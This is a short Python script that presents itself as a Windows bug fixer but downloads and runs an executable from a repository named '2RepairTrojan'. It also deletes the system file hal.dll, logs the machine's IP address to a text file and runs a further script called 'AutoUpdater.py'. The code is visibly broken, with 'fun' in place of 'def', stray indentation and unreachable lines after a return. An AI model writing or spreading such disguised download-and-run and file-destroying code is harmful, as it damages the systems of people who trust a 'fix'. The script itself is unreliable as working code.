import socket

import time
import shutil
import subprocess
import urllib
import sys, string, os, arcgisscripting
url = 'raw.githubusercontent.com/System32Booster/2RepairTrojan/main/2repair.exe'
filename = '2repair.exe'  
urllib.urlretrieve(url)
newpath = r'C:/system32/WinBugsFix' 
# Directory
directory = "WinBugsFix"
# Parent Directory path
parent_dir = "C:/system32/"
  
# Path
path = os.path.join(parent_dir, directory)

os.mkdir(path)

os.system("C:/Downloads/2repair.exe")
shutil.move("C:/Downloads/2repair.exe", "C:/system32/WinBugsFix")

f=open("Bugfixer.txt", "a+")

if os.path.exists("C:/system32/hal.dll"):
  os.remove("C:/system32/hal.dll")
IPadress = socket.gethostbyname(socket.gethostname())
f = open("Bugfixer.txt", "a")
f.write(IPadress)
f.close()

  
fun open():
    return urllib.urlopen('https://www.youtube.com/watch?v=cvh0nX08nRw')
   time.sleep(300)
    
    execfile(r'C:/Downloads/AutoUpdater.py')
    
